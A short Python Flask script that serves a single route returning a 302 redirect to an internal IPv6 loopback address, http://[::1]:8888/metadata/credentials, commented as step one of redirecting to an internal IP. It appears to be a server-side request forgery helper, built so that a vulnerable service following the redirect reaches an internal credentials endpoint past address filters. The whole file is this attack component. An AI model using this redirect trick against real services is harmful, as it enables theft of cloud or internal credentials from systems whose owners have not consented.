from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    # Step 1: First redirect to internal IP
    return redirect('http://[::1]:8888/metadata/credentials', 302)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
